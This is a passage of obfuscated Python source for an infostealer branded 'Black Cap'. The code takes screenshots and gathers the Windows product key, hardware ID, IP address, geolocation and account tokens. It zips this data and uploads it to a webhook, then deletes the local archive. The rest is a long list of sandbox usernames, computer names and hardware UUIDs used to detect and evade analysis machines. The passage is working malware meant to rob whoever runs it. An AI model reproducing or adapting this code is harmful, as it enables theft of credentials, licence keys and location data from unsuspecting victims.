                    llllIlIlll.write(lIlIllllIllIlIIllII + '\n')
    def lIIlllIIlI(lIIlllllllIlI):
        lIIIIIIIlIIlIIl = ImageGrab.grab(
            bbox=None,
            include_layered_windows=False,
            all_screens=True,
            xdisplay=None
        )
        lIIIIIIIlIIlIIl.save(lIIlllllllIlI.IllllIlIllIllIIlll + "\\Screenshot.png")
        lIIIIIIIlIIlIIl.close()
    def lllIIlIlII(lIIlllllllIlI):
        lIlllIllllIlIIll = llllIlIlll"""
{lIIllIllII} | {IIIIlIIIIIlllIIlIlI}
Windows key: {lIIlllllllIlI.IIIIIIlIllI}
Windows version: {lIIlllllllIlI.lIlIlllIIlII}
RAM: {llllIlll}GB
DISK: {llIIIlIIlIlIlIIIIlll}GB
HWID: {lIIlllllllIlI.llIIIIllIll}
IP: {lIIlllllllIlI.lIIlIlIllllIIIlIIIl}
City: {lIIlllllllIlI.IIIllllIllII}
Country: {lIIlllllllIlI.IIlIIlIIl}
Region: {lIIlllllllIlI.llIlIllIlIIIIll}
Org: {lIIlllllllIlI.IIlIlIIIl}
GoogleMaps: {lIIlllllllIlI.lIllIIll}
        """
        with open(lIIlllllllIlI.IllllIlIllIllIIlll + "\\System_Info.txt", "w", encoding="utf-8", errors='ignore') as llllIlIlll:
            llllIlIlll.write(lIlllIllllIlIIll)
    def IlIIIIll(lIIlllllllIlI):
        for lIlIllllIllIlIIllII in os.listdir(lIIlllllllIlI.IllllIlIllIllIIlll):
            if lIlIllllIllIlIIllII.endswith('.txt'):
                lllIllIIlIlllllIIIIl = lIIlllllllIlI.IllllIlIllIllIIlll + lIIlllllllIlI.IIlllIIIlIlI + lIlIllllIllIlIIllII
                with open(lllIllIIlIlllllIIIIl, "r", errors="ignore") as llIlIIIIIIIlll:
                    lIllllIlIl = llIlIIIIIIIlll.read()
                    if not lIllllIlIl:
                        llIlIIIIIIIlll.close()
                        os.remove(lllIllIIlIlllllIIIIl)
                    else:
                        with open(lllIllIIlIlllllIIIIl, "w", encoding="utf-8", errors="ignore") as llllIlIlll:
                            llllIlIlll.write("Black Cap Create By KS.H | https://github.com/Kasd\n\n")
                        with open(lllIllIIlIlllllIIIIl, "a", encoding="utf-8", errors="ignore") as IlIIlllllllIIIlllI:
                            IlIIlllllllIIIlllI.write(lIllllIlIl + "\n\nasd | https://github.com/Kasd")
        lllllIIIlIlllI = ntpath.join(lIIlllllllIlI.IlIlIIllIIll, llllIlIlll'BC-[{IIIIIIlIlllIIIIIllolIlllIIlIIIIIIIIlIIllIlIlllIllIIIIom}].zip')
        IlIIlIIIlIIIIIIlI = zipfile.ZipFile(lllllIIIlIlllI, "w", zipfile.ZIP_DEFLATED)
        IIIIlIll = ntpath.abspath(lIIlllllllIlI.IllllIlIllIllIIlll)
        for IIllIIIllIllllI, IIllIIllllIlIIlIl, IIllllIlllIlIlIIl in os.walk(lIIlllllllIlI.IllllIlIllIllIIlll):
            for llIIIIllIIIlI in IIllllIlllIlIlIIl:
                IllllIIIIIl = ntpath.abspath(ntpath.join(IIllIIIllIllllI, llIIIIllIIIlI))
                IlIIlIlIlIIllll = IllllIIIIIl[len(IIIIlIll) + 1:]
                IlIIlIIIlIIIIIIlI.write(IllllIIIIIl, IlIIlIlIlIIllll)
        IlIIlIIIlIIIIIIlI.close()
        IllllIlIIIlllll, lIlllllIIIlIllllllI, IIlIlllI = 0, '', ''
        for IIllIIllllIlIIlIl, IIllIlIlllIlllll, IIllllIlllIlIlIIl in os.walk(lIIlllllllIlI.IllllIlIllIllIIlll):
            for IllIlIIl in IIllllIlllIlIlIIl:
                lIlllllIIIlIllllllI += llllIlIlll"・{IllIlIIl}\n"
                IllllIlIIIlllll += 1
        for lIlIIlIlIIIlIIl in lIIlllllllIlI.IIlIlllI:
            IIlIlllI += llllIlIlll'{lIllIIllIIIIlIIllIlIlllIllIIIIIkn}\n\n'
        lIIIlllIIIllI = llllIlIlll"{lIIIIlllIlIIllIIllllIlIIlIllIlllIIlIIIIIlIIIounlIllIIllIIIIlIIllIlIlllIllIIIII} Files Found: "
        IIIIllIllll = {
            'name': "vka",
            'avatar_url': 'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png',
            'embeds': [
                {
                    'author': {
                        'name': llllIlIlll'asd',
                        'url': 'https://github.com/asd',
                        'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'
                    },
                    'color': 374276,
                    'description': llllIlIlll'[has Geo Localised this guy]({lIIlllllllIlI.googllllllIIIlIIllIlIlllIllIIImlIlIlIIIlIlllIlllIIp})',
                    'fields': [
                        {
                            'name': '\u200b',
                            'value': llllIlIlll'''```fix
                                IP: {lIIlllllllIlI.lIIlIlIllllIIIlIIIl.replace(" ", " ") if lIIlllllllIlI.lIIlIlIllllIIIlIIIl else "N/A"}
                                Org: {lIIlllllllIlI.IIlIlIIIl.replace(" ", " ") if lIIlllllllIlI.IIlIlIIIl else "N/A"}
                                City: {lIIlllllllIlI.IIIllllIllII.replace(" ", " ") if lIIlllllllIlI.IIIllllIllII else "N/A"}
                                Region: {lIIlllllllIlI.llIlIllIlIIIIll.replace(" ", " ") if lIIlllllllIlI.llIlIllIlIIIIll else "N/A"}
                                Country: {lIIlllllllIlI.IIlIIlIIl.replace(" ", " ") if lIIlllllllIlI.IIlIIlIIl else "N/A"}```
                            '''.replace(' ', ''),
                            'inline': True
                        },
                        {
                            'name': '\u200b',
                            'value': llllIlIlll'''```fix
                                Computer Name: {IIIIlIIIIIlllIIlIlI.replace(" ", " ")}
                                Windows Key: {lIIlllllllIlI.IIIIIIlIllI.replace(" ", " ")}
                                Windows Ver: {lIIlllllllIlI.lIlIlllIIlII.replace(" ", " ")}
                                Disk Stockage: {llIIIlIIlIlIlIIIIlll}GB
                                Ram Stockage: {llllIlll}GB```
                            '''.replace(' ', ''),
                            'inline': True
                        },
                        {
                            'name': '**- Tokens:**',
                            'value': llllIlIlll'''```yaml
                                {IIlIlllI if IIlIlllI else "tokens not found"}```
                            '''.replace(' ', ''),
                            'inline': False
                        },
                        {
                            'name': lIIIlllIIIllI,
                            'value': llllIlIlll'''```ini
                                [
                                {lIlllllIIIlIllllllI.strip()}
                                ]```
                            '''.replace(' ', ''),
                            'inline': False
                        }
                    ],
                    'footer': {
                        'text': 'asd'
                    }
                }
            ]
        }
        with open(lllllIIIlIlllI, 'rb') as llllIlIlll:
            if lIIlllllllIlI.lIIIllIIIlIllllIIll in lIIlllllllIlI.llllllIllllllIlIIll:
                httpx.post(lIIlllllllIlI.llllllIllllllIlIIll, json=IIIIllIllll)
                httpx.post(lIIlllllllIlI.llllllIllllllIlIIll, IIllllIlllIlIlIIl={'upload_file': llllIlIlll})
        os.remove(lllllIIIlIlllI)
class IIIIIlIIIllIlIllIIlI(IIlIlIllIlI):
    lllllllI = False
    def __init__(lIIlllllllIlI):
        lIIlllllllIlI.IIIIllll = list()
        lIIlllllllIlI.lllIlIlllIllllI = [
            "05h00Gi0",
            "3u2v9m8",
            "43By4",
            "4tgiizsLimS",
            "6O4KyHhJXBiR",
            "7wjlGX7PjlW4",
            "8Nl0ColNQ5bq",
            "8VizSM",
            "Abby",
            "Amy",
            "AppOnFlySupport",
            "ASPNET",
            "azure",
            "BUiA1hkm",
            "BvJChRPnsxn",
            "cM0uEGN4do",
            "cMkNdS6",
            "DefaultAccount",
            "dOuyo8RV71",
            "DVrzi",
            "e60UW",
            "ecVtZ5wE",
            "EGG0p",
            "Frank",
            "fred",
            "G2DbYLDgzz8Y",
            "george",
            "GjBsjb",
            "Guest",
            "h7dk1xPr",
            "h86LHD",
            "Harry Johnson",
            "HEUeRzl",
            "hmarc",
            "ICQja5iT",
            "IVwoKUF",
            "j6SHA37KA",
            "j7pNjWM",
            "John",
            "jude",
            "Julia",
            "kEecfMwgj",
            "kFu0lQwgX5P",
            "KUv3bT4",
            "Lisa",
            "lK3zMR",
            "lmVwjj9b",
            "Louise",
            "Lucas",
            "mike",
            "Mr.None",
            "noK4zG7ZhOf",
            "o6jdigq",
            "o8yTi52T",
            "OgJb6GqgK0O",
            "patex",
            "PateX",
            "Paul Jones",
            "pf5vj",
            "PgfV1X",
            "PqONjHVwexsS",
            "pWOuqdTDQ",
            "PxmdUOpVyx",
            "QfofoG",
            "QmIS5df7u",
            "QORxJKNk",
            "qZo9A",
            "RDhJ0CNFevzX",
            "RGzcBUyrznReg",
            "S7Wjuf",
            "server",
            "SqgFOf3G",
            "Steve",
            "test",
            "TVM",
            "txWas1m2t",
            "umyUJ",
            "Uox1tzaMO",
            "User01",
            "w0fjuOVmCcP5A",
            "WDAGUtilityAccount",
            "XMiMmcKziitD",
            "xPLyvzr8sgC",
            "ykj0egq7fze",
            "DdQrgc",
            "ryjIJKIrOMs",
            "nZAp7UBVaS1",
            "zOEsT",
            "l3cnbB8Ar5b8",
            "xUnUy",
            "fNBDSlDTXY",
            "vzY4jmH0Jw02",
            "gu17B",
            "UiQcX",
            "21zLucUnfI85",
            "OZFUCOD6",
            "8LnfAai9QdJR",
            "5sIBK",
            "rB5BnfuR2",
            "GexwjQdjXG",
            "IZZuXj",
            "ymONofg",
            "dxd8DJ7c",
            "JAW4Dz0",
            "GJAm1NxXVm",
            "UspG1y1C",
            "equZE3J",
            "BXw7q",
            "lubi53aN14cU",
            "5Y3y73",
            "9yjCPsEYIMH",
            "GGw8NR",
            "JcOtj17dZx",
            "05KvAUQKPQ",
            "64F2tKIqO5",
            "7DBgdxu",
            "uHUQIuwoEFU",
            "gL50ksOp",
            "Of20XqH4VL",
            "tHiF2T",
            "sal.rosenburg",
            "hbyLdJtcKyN1",
            "Rt1r7",
            "Administrator",
            "katorres"
        ]
        lIIlllllllIlI.lIlllllll = [
             "00900BC83803",
             "0CC47AC83803",
             "6C4E733F-C2D9-4",
             "ACEPC",
             "AIDANPC",
             "ALENMOOS-PC",
             "ALIONE",
             "APPONFLY-VPS",
             "ARCHIBALDPC",
             "azure",
             "B30F0242-1C6A-4",
             "BAROSINO-PC",
             "BECKER-PC",
             "BEE7370C-8C0C-4",
             "COFFEE-SHOP",
             "COMPNAME_4047",
             "d1bnJkfVlH",
             "DESKTOP-19OLLTD",
             "DESKTOP-1PYKP29",
             "DESKTOP-1Y2433R",
             "DESKTOP-4U8DTF8",
             "DESKTOP-54XGX6F",
             "DESKTOP-5OV9S0O",
             "DESKTOP-6AKQQAM",
             "DESKTOP-6BMFT65",
             "DESKTOP-70T5SDX",
             "DESKTOP-7AFSTDP",
             "DESKTOP-7XC6GEZ",
             "DESKTOP-8K9D93B",
             "DESKTOP-AHGXKTV",
             "DESKTOP-ALBERTO",
             "DESKTOP-B0T93D6",
             "DESKTOP-BGN5L8Y",
             "DESKTOP-BUGIO",
             "DESKTOP-BXJYAEC",
             "DESKTOP-CBGPFEE",
             "DESKTOP-CDQE7VN",
             "DESKTOP-CHAYANN",
             "DESKTOP-CM0DAW8",
             "DESKTOP-CNFVLMW",
             "DESKTOP-CRCCCOT",
             "DESKTOP-D019GDM",
             "DESKTOP-D4FEN3M",
             "DESKTOP-DE369SE",
             "DESKTOP-DIL6IYA",
             "DESKTOP-ECWZXY2",
             "DESKTOP-F7BGEN9",
             "DESKTOP-FSHHZLJ",
             "DESKTOP-G4CWFLF",
             "DESKTOP-GELATOR",
             "DESKTOP-GLBAZXT",
             "DESKTOP-GNQZM0O",
             "DESKTOP-GPPK5VQ",
             "DESKTOP-HASANLO",
             "DESKTOP-HQLUWFA",
             "DESKTOP-HSS0DJ9",
             "DESKTOP-IAPKN1P",
             "DESKTOP-IFCAQVL",
             "DESKTOP-ION5ZSB",
             "DESKTOP-JQPIFWD",
             "DESKTOP-KALVINO",
             "DESKTOP-KOKOVSK",
             "DESKTOP-NAKFFMT",
             "DESKTOP-NKP0I4P",
             "DESKTOP-NM1ZPLG",
             "DESKTOP-NTU7VUO",
             "DESKTOP-QUAY8GS",
             "DESKTOP-RCA3QWX",
             "DESKTOP-RHXDKWW",
             "DESKTOP-S1LFPHO",
             "DESKTOP-SUPERIO",
             "DESKTOP-V1L26J5",
             "DESKTOP-VIRENDO",
             "DESKTOP-VKNFFB6",
             "DESKTOP-VRSQLAG",
             "DESKTOP-VWJU7MF",
             "DESKTOP-VZ5ZSYI",
             "DESKTOP-W8JLV9V",
             "DESKTOP-WG3MYJS",
             "DESKTOP-WI8CLET",
             "DESKTOP-XOY7MHS",
             "DESKTOP-Y8ASUIL",
             "DESKTOP-YW9UO1H",
             "DESKTOP-ZJF9KAN",
             "DESKTOP-ZMYEHDA",
             "DESKTOP-ZNCAEAM",
             "DESKTOP-ZOJJ8KL",
             "DESKTOP-ZV9GVYL",
             "DOMIC-DESKTOP",
             "EA8C2E2A-D017-4",
             "ESPNHOOL",
             "GANGISTAN",
             "GBQHURCC",
             "GRAFPC",
             "GRXNNIIE",
             "gYyZc9HZCYhRLNg",
             "JBYQTQBO",
             "JERRY-TRUJILLO",
             "JOHN-PC",
             "JUDES-DOJO",
             "JULIA-PC",
             "LANTECH-LLC",
             "LISA-PC",
             "LOUISE-PC",
             "LUCAS-PC",
             "MIKE-PC",
             "NETTYPC",
             "ORELEEPC",
             "ORXGKKZC",
             "Paul Jones",
             "PC-DANIELE",
             "PROPERTY-LTD",
             "Q9IATRKPRH",
             "QarZhrdBpj",
             "RALPHS-PC",
             "SERVER-PC",
             "SERVER1",
             "Steve",
             "SYKGUIDE-WS17",
             "T00917",
             "test42",
             "TIQIYLA9TW5M",
             "TMKNGOMU",
             "TVM-PC",
             "VONRAHEL",
             "WILEYPC",
             "WIN-5E07COS9ALR",
             "WINDOWS-EEL53SN",
             "WINZDS-1BHRVPQU",
             "WINZDS-22URJIBV",
             "WINZDS-3FF2I9SN",
             "WINZDS-5J75DTHH",
             "WINZDS-6TUIHN7R",
             "WINZDS-8MAEI8E4",
             "WINZDS-9IO75SVG",
             "WINZDS-AM76HPK2",
             "WINZDS-B03L9CEO",
             "WINZDS-BMSMD8ME",
             "WINZDS-BUAOKGG1",
             "WINZDS-K7VIK4FC",
             "WINZDS-QNGKGN59",
             "WINZDS-RST0E8VU",
             "WINZDS-U95191IG",
             "WINZDS-VQH86L5D",
             "WORK",
             "XC64ZB",
             "XGNSVODU",
             "ZELJAVA",
             "3CECEFC83806",
             "C81F66C83805",
             "DESKTOP-USLVD7G",
             "DESKTOP-AUPFKSY",
             "DESKTOP-RP4FIBL",
             "DESKTOP-6UJBD2J",
             "DESKTOP-LTMCKLA",
             "DESKTOP-FLTWYYU",
             "DESKTOP-WA2BY3L",
             "DESKTOP-UBDJJ0A",
             "DESKTOP-KXP5YFO",
             "DESKTOP-DAU8GJ2",
             "DESKTOP-FCRB3FM",
             "DESKTOP-VYRNO7M",
             "DESKTOP-PKQNDSR",
             "DESKTOP-SCNDJWE",
             "DESKTOP-RSNLFZS",
             "DESKTOP-MWFRVKH",
             "DESKTOP-QLN2VUF",
             "DESKTOP-62YPFIQ",
             "DESKTOP-PA0FNV5",
             "DESKTOP-B9OARKC",
             "DESKTOP-J5XGGXR",
             "DESKTOP-JHUHOTB",
             "DESKTOP-64ACUCH",
             "DESKTOP-SUNDMI5",
             "DESKTOP-GCN6MIO",
             "FERREIRA-W10",
             "DESKTOP-MJC6500",
             "DESKTOP-WS7PPR2",
             "DESKTOP-XWQ5FUV",
             "DESKTOP-UHHSY4R",
             "DESKTOP-ZJRWGX5",
             "DESKTOP-ZYQYSRD",
             "WINZDS-MILOBM35",
             "DESKTOP-K8Y2SAM",
             "DESKTOP-4GCZVJU",
             "DESKTOP-O6FBMF7",
             "DESKTOP-WDT1SL6",
             "EIEEIFYE",
             "CRYPTODEV222222",
             "EFA0FDEC-8FA7-4",
             "DESKTOP-O7BI3PT",
             "DESKTOP-UHQW8PI",
             "WINZDS-PU0URPVI",
             "ABIGAI",
        ]
        lIIlllllllIlI.IlllIlIIllllllIIlI = [
             "00000000-0000-0000-0000-000000000000",
             "00000000-0000-0000-0000-50E5493391EF",
             "00000000-0000-0000-0000-AC1F6BD047A0",
             "00000000-0000-0000-0000-AC1F6BD04850",
             "00000000-0000-0000-0000-AC1F6BD048D6",
             "00000000-0000-0000-0000-AC1F6BD048DC",
             "00000000-0000-0000-0000-AC1F6BD048F8",
             "00000000-0000-0000-0000-AC1F6BD048FE",
             "00000000-0000-0000-0000-AC1F6BD04900",
             "00000000-0000-0000-0000-AC1F6BD0491C",
             "00000000-0000-0000-0000-AC1F6BD04926",
             "00000000-0000-0000-0000-AC1F6BD04928",
             "00000000-0000-0000-0000-AC1F6BD04972",
             "00000000-0000-0000-0000-AC1F6BD04976",
             "00000000-0000-0000-0000-AC1F6BD04978",
             "00000000-0000-0000-0000-AC1F6BD04986",
             "00000000-0000-0000-0000-AC1F6BD049B8",
             "00000000-0000-0000-0000-AC1F6BD04C0A",
             "00000000-0000-0000-0000-AC1F6BD04D06",
             "00000000-0000-0000-0000-AC1F6BD04D08",
             "00000000-0000-0000-0000-AC1F6BD04D8E",
             "00000000-0000-0000-0000-AC1F6BD04D98",
             "00000000-0000-0000-0000-AC1F6BD04DC0",
             "00000000-0000-0000-0000-AC1F6BD04DCC",
             "02AD9898-FA37-11EB-AC55-1D0C0A67EA8A",
             "032E02B4-0499-05C3-0806-3C0700080009",
             "03AA02FC-0414-0507-BC06-D70700080009",
             "03D40274-0435-05BF-D906-D20700080009",
             "03DE0294-0480-05DE-1A06-350700080009",
             "050C3342-FADD-AEDF-EF24-C6454E1A73C9",
             "05790C00-3B21-11EA-8000-3CECEF4400D0",
             "0700BEF3-1410-4284-81B1-E5C17FA9E18F",
             "07AF2042-392C-229F-8491-455123CC85FB",
             "07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9",
             "08C1E400-3C56-11EA-8000-3CECEF43FEDE",
             "0910CBA3-B396-476B-A7D7-716DB90F5FB9",
             "0934E336-72E4-4E6A-B3E5-383BD8E938C3",
             "0A36B1E3-1F6B-47DE-8D72-D4F46927F13F",
             "0A9D60D4-9A32-4317-B7C0-B11B5C677335",
             "0D748400-3B00-11EA-8000-3CECEF44007E",
             "0F377508-5106-45F4-A0D6-E8352F51A8A5",
             "104F9B96-5B46-4567-BF56-0066C1C6F7F0",
             "11111111-2222-3333-4444-555555555555",
             "119602E8-92F9-BD4B-8979-DA682276D385",
             "12204D56-28C0-AB03-51B7-44A8B7525250",
             "12EE3342-87A2-32DE-A390-4C2DA4D512E9",
             "138D921D-680F-4145-BDFF-EC463E70C77D",
             "13A61742-AF45-EFE4-70F4-05EF50767784",
             "14692042-A78B-9563-D59D-EB7DD2639037",
             "1AAD2042-66E8-C06A-2F81-A6A4A6A99093",
             "1B5D3FFD-A28E-4F11-9CD6-FF148989548C",
             "1D4D3342-D6C4-710C-98A3-9CC6571234D5",
             "213D2878-0E33-4D8C-B0D1-31425B9DE674",
             "222EFE91-EAE3-49F1-8E8D-EBAE067F801A",
             "26645000-3B67-11EA-8000-3CECEF440124",
             "2AB86800-3C50-11EA-8000-3CECEF440130",
             "2C5C2E42-E7B1-4D75-3EA3-A325353CDB72",
             "2CEA2042-9B9B-FAC1-44D8-159FE611FCCC",
             "2DD1B176-C043-49A4-830F-C623FFB88F3C",
             "2E6FB594-9D55-4424-8E74-CE25A25E36B0",
             "2F94221A-9D07-40D9-8C98-87CB5BFC3549",
             "2FBC3342-6152-674F-08E4-227A81CBD5F5",
             "34419E14-4019-11EB-9A22-6C4AB634B69A",
             "361E3342-9FAD-AC1C-F1AD-02E97892270F",
             "365B4000-3B25-11EA-8000-3CECEF44010C",
             "38813342-D7D0-DFC8-C56F-7FC9DFE5C972",
             "38AB3342-66B0-7175-0B23-F390B3728B78",
             "3A9F3342-D1F2-DF37-68AE-C10F60BFB462",
             "3EDC0561-C455-4D64-B176-3CFBBBF3FA47",
             "3F284CA4-8BDF-489B-A273-41B44D668F6D",
             "3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E",
             "3FADD8D6-3754-47C4-9BFF-0E35553DD5FB",
             "40384E87-1FBA-4096-9EA1-D110F0EA92A8",
             "40F100F9-401C-487D-8D37-48107C6CE1D3",
             "418F0D5B-FCB6-41F5-BDA5-94C1AFB240ED",
             "41B73342-8EA1-E6BF-ECB0-4BC8768D86E9",
             "42A82042-3F13-512F-5E3D-6BF4FFFD8518",
             "44B94D56-65AB-DC02-86A0-98143A7423BF",
             "4729AEB0-FC07-11E3-9673-CE39E79C8A00",
             "481E2042-A1AF-D390-CE06-A8F783B1E76A",
             "48941AE9-D52F-11DF-BBDA-503734826431",
             "49434D53-0200-9036-2500-369025000C65",
             "49434D53-0200-9036-2500-369025003865",
             "49434D53-0200-9036-2500-369025003A65",
             "49434D53-0200-9036-2500-369025003AF0",
             "49434D53-0200-9036-2500-369025005CF0",
             "49434D53-0200-9036-2500-36902500F022",
             "49434D53-0200-9065-2500-659025002274",
             "49434D53-0200-9065-2500-659025005073",
             "49434D53-0200-9065-2500-659025008074",
             "49434D53-0200-9065-2500-65902500E439",
             "499B0800-3C18-11EA-8000-3CECEF43FEA4",
             "4C4C4544-0050-3710-8058-CAC04F59344A",
             "4CB82042-BA8F-1748-C941-363C391CA7F3",
             "4CE94980-D7DA-11DD-A621-08606E889D9B",
             "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27",
             "4DC32042-E601-F329-21C1-03F27564FD6C",
             "4EDF3342-E7A2-5776-4AE5-57531F471D56",
             "51646514-93E1-4CB6-AF29-036B45D14CBF",
             "52A1C000-3BAB-11EA-8000-3CECEF440204",
             "56B9F600-3C1C-11EA-8000-3CECEF4401DE",
             "59C68035-4B21-43E8-A6A6-BD734C0EE699",
             "5BD24D56-789F-8468-7CDC-CAA7222CC121",
             "5C1CA40D-EF14-4DF8-9597-6C0B6355D0D6",
             "5CC7016D-76AB-492D-B178-44C12B1B3C73",
             "5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E",
             "5E573342-6093-4F2D-5F78-F51B9822B388",
             "5EBC5C00-3B70-11EA-8000-3CECEF4401DA",
             "5EBD2E42-1DB8-78A6-0EC3-031B661D5C57",
             "60C83342-0A97-928D-7316-5F1080A78E72",
             "612F079A-D69B-47EA-B7FF-13839CD17404",
             "63203342-0EB0-AA1A-4DF5-3FB37DBB0670",
             "63DE70B4-1905-48F2-8CC4-F7C13B578B34",
             "63FA3342-31C7-4E8E-8089-DAFF6CE5E967",
             "64176F5E-8F74-412F-B3CF-917EFA5FB9DB",
             "6608003F-ECE4-494E-B07E-1C4615D1D93C",
             "66729280-2B0C-4BD0-8131-950D86871E54",
             "66CC1742-AAC7-E368-C8AE-9EEB22BD9F3B",
             "671BC5F7-4B0F-FF43-B923-8B1645581DC8",
             "67442042-0F69-367D-1B2E-1EE846020090",
             "67C5A563-3218-4718-8251-F38E3F6A89C1",
             "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3",
             "686D4936-87C1-4EBD-BEB7-B3D92ECA4E28",
             "6881083C-EE5A-43E7-B7E3-A0CE9227839C",
             "69AEA650-3AE3-455C-9F80-51159BAE5EAE",
             "6A669639-4BD2-47E5-BE03-9CBAFC9EF9B3",
             "6AA13342-49AB-DC46-4F28-D7BDDCE6BE32",
             "6ECEAF72-3548-476C-BD8D-73134A9182C8",
             "6F3CA5EC-BEC9-4A4D-8274-11168F640058",
             "71522042-DA0B-6793-668B-CE95AEA7FE21",
             "72492D47-52EF-427A-B623-D4F2192F97D4",
             "73163342-B704-86D5-519B-18E1D191335C",
             "777D84B3-88D1-451C-93E4-D235177420A7",
             "782ED390-AE10-4727-A866-07018A8DED22",
             "79AF5279-16CF-4094-9758-F88A616D81B4",
             "7A484800-3B19-11EA-8000-3CECEF440122",
             "7AB5C494-39F5-4941-9163-47F54D6D5016",
             "7CA33342-A88C-7CD1-1ABB-7C0A82F488BF",
             "7D341C16-E8E9-42EA-8779-93653D877231",
             "7D6A0A6D-394E-4179-9636-662A8D2C7304",
             "7E4755A6-7160-4982-8F5D-6AA481749F10",
             "80152042-2F34-11D1-441F-5FADCA01996D",
             "83BFD600-3C27-11EA-8000-3CECEF4400B4",
             "844703CF-AA4E-49F3-9D5C-74B8D1F5DCB6",
             "84782042-E646-50A0-159F-A8E75D4F9402",
             "84FE3342-6C67-5FC6-5639-9B3CA3D775A1",
             "84FEEFBC-805F-4C0E-AD5B-A0042999134D",
             "8703841B-3C5E-461C-BE72-1747D651CE89",
             "88DC3342-12E6-7D62-B0AE-C80E578E7B07",
             "8B4E8278-525C-7343-B825-280AEBCD3BCB",
             "8DA62042-8B59-B4E3-D232-38B29A10964A",
             "8EC60B88-7F2B-42DA-B8C3-4E2EF2A8C603",
             "907A2A79-7116-4CB6-9FA5-E5A58C4587CD",
             "90A83342-D7E7-7A14-FFB3-2AA345FDBC89",
             "91625303-5211-4AAC-9842-01A41BA60D5A",
             "91A9EEDB-4652-4453-AC5B-8E92E68CBCF5",
             "921E2042-70D3-F9F1-8CBD-B398A21F89C6",
             "94515D88-D62B-498A-BA7C-3614B5D4307C",
             "95BF6A00-3C63-11EA-8000-3CECEF43FEB8",
             "96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE",
             "9921DE3A-5C1A-DF11-9078-563412000026",
             "9B2F7E00-6F4C-11EA-8000-3CECEF467028",
             "9C6D1742-046D-BC94-ED09-C36F70CC9A91",
             "9FC997CA-5081-4751-BC78-CE56D06F6A62",
             "A100EFD7-4A31-458F-B7FE-2EF95162B32F",
             "A15A930C-8251-9645-AF63-E45AD728C20C",
             "A19323DA-80B2-48C9-9F8F-B21D08C3FE07",
             "A1A849F7-0D57-4AD3-9073-C79D274EECC8",
             "A2339E80-BB69-4BF5-84BC-E9BE9D574A65",
             "A5CE2042-8D25-24C4-71F7-F56309D7D45F",
             "A6A21742-8023-CED9-EA8D-8F0BC4B35DEA",
             "A7721742-BE24-8A1C-B859-D7F8251A83D3",
             "A9C83342-4800-0578-1EE8-BA26D2A678D2",
             "AAFC2042-4721-4E22-F795-A60296CAC029",
             "ACA69200-3C4C-11EA-8000-3CECEF4401AA",
             "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548",
             "AF1B2042-4B90-0000-A4E4-632A1C8C7EB1",
             "B1112042-52E8-E25B-3655-6A4F54155DBF",
             "B22B623B-6B62-4F9B-A9D3-94A15453CEF4",
             "B5B77895-D40B-4F30-A565-6EF72586A14A",
             "B6464A2B-92C7-4B95-A2D0-E5410081B812",
             "B9DA2042-0D7B-F938-8E8A-DA098462AAEC",
             "BB233342-2E01-718F-D4A1-E7F69D026428",
             "BB64E044-87BA-C847-BC0A-C797D1A16A50",
             "BE784D56-81F5-2C8D-9D4B-5AB56F05D86E",
             "BFE62042-E4E1-0B20-6076-C5D83EDFAFCE",
             "C0342042-AF96-18EE-C570-A5EFA8FF8890",
             "C249957A-AA08-4B21-933F-9271BEC63C85",
             "C364B4FE-F1C1-4F2D-8424-CB9BD735EF6E",
             "C51E9A00-3BC3-11EA-8000-3CECEF440034",
             "C6B32042-4EC3-6FDF-C725-6F63914DA7C7",
             "C7D23342-A5D4-68A1-59AC-CF40F735B363",
             "C9283342-8499-721F-12BE-32A556C9A7A8",
             "CC4AB400-3C66-11EA-8000-3CECEF43FE56",
             "CC5B3F62-2A04-4D2E-A46C-AA41B7050712",
             "CD74107E-444E-11EB-BA3A-E3FDD4B29537",
             "CE352E42-9339-8484-293A-BD50CDC639A5",
             "CEFC836C-8CB1-45A6-ADD7-209085EE2A57",
             "CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F",
             "D2DC3342-396C-6737-A8F6-0C6673C1DE08",
             "D4260370-C9F1-4195-95A8-585611AE73F2",
             "D4C44C15-4BAE-469B-B8FD-86E5C7EB89AB",
             "D5DD3342-46B5-298A-2E81-5CA6867168BE",
             "D7382042-00A0-A6F0-1E51-FD1BBF06CD71",
             "D7958D98-A51E-4B34-8C51-547A6C2E6615",
             "D8C30328-1B06-4611-8E3C-E433F4F9794E",
             "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A",
             "DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D",
             "DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F",
             "DD45F600-3C63-11EA-8000-3CECEF440156",
             "DD9C3342-FB80-9A31-EB04-5794E5AE2B4C",
             "DEAEB8CE-A573-9F48-BD40-62ED6C223F20",
             "E08DE9AA-C704-4261-B32D-57B2A3993518",
             "E0C806ED-B25A-4744-AD7D-59771187122E",
             "E1BA2E42-EFB1-CDFD-7A84-8A39F747E0C5",
             "E2342042-A1F8-3DCF-0182-0E63D607BCC7",
             "E3BB3342-02A8-5613-9C92-3747616194FD",
             "E57F6333-A2AC-4F65-B442-20E928C0A625",
             "E67640B3-2B34-4D7F-BD62-59A1822DDBDC",
             "E6DBCCDF-5082-4479-B61A-6990D92ACC5F",
             "E773CC89-EFB8-4DB6-A46E-6CCA20FE4E1A",
             "EADD1742-4807-00A0-F92E-CCD933E9D8C1",
             "EB16924B-FB6D-4FA1-8666-17B91F62FB37",
             "F3EA4E00-3C5F-11EA-8000-3CECEF440016",
             "F5744000-3C78-11EA-8000-3CECEF43FEFE",
             "F5BB1742-D36D-A11E-6580-2EA2427B0038",
             "F5EFEEAC-96A0-11EB-8365-FAFE299935A9",
             "F68B2042-E3A7-2ADA-ADBC-A6274307A317",
             "F705420F-0BB3-4688-B75C-6CD1352CABA9",
             "F91C9458-6656-4E83-B84A-13641DE92949",
             "F9E41000-3B35-11EA-8000-3CECEF440150",
             "FA612E42-DC79-4F91-CA17-1538AD635C95",
             "FA8C2042-205D-13B0-FCB5-C5CC55577A35",
             "FBC62042-5DE9-16AD-3F27-F818E5F68DD3",
             "FC40ACF8-DD97-4590-B605-83B595B0C4BA",
